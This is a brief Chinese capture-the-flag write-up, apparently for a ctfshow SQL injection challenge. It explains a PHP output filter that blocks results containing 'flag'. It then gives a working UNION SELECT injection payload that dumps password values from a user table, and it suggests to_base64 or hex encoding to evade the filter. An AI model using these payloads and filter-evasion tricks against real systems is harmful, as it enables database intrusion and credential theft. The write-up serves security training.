# 知识点
过滤ctf字符串
# 思路
```php
//检查结果是否有flag
    if(!preg_match('/flag/i', json_encode($ret))){
      $ret['msg']='查询成功';
    }
```
### 方法一
不查询username字段
```plsql
1' union select 1,2,group_concat(id,0x7e,password) from ctfshow_user3 where id =26  --+
```
### 方法二
我们还可以使用to_base64或则hex函数进行加密过滤
